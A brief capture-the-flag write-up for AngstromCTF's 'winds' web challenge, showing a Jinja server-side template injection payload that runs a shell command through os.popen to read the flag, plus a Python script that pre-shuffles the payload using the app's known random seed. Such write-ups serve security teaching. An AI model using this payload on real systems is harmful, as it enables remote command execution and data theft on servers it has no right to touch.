<font size = '4'>
<p align = 'center'>
<b>
AngstromCTF - winds Writeup 
</b>
</p>
</font>

<br>
<font size = '3'>

<b>Challenge Description:</b><br>

Challenge: https://winds.web.actf.co/

app.py

<br>

<b>Exploitation:</b><br>

SSTI Challenge. We need to send the SSTI script `cycler.__init__.__globals__.os.popen('cat flag.txt').read()`, however its jumbled while sending. The seed is given, so script can be created to unjumble.

```python
import random


text1="{{ cycler.__init__.__globals__.os.popen('cat flag.txt').read() }}"

text = [i for i in range(len(text1))]
random.seed(0)
jumbled = list(text)
random.shuffle(jumbled)

print(jumbled)

newl=[0]*len(text1)
for i in range(len(text1)):
    newl[jumbled[i]]=text1[i]
print(''.join(newl))

random.seed(0)
jumbled = list(newl)
random.shuffle(jumbled)

print(''.join(jumbled))
```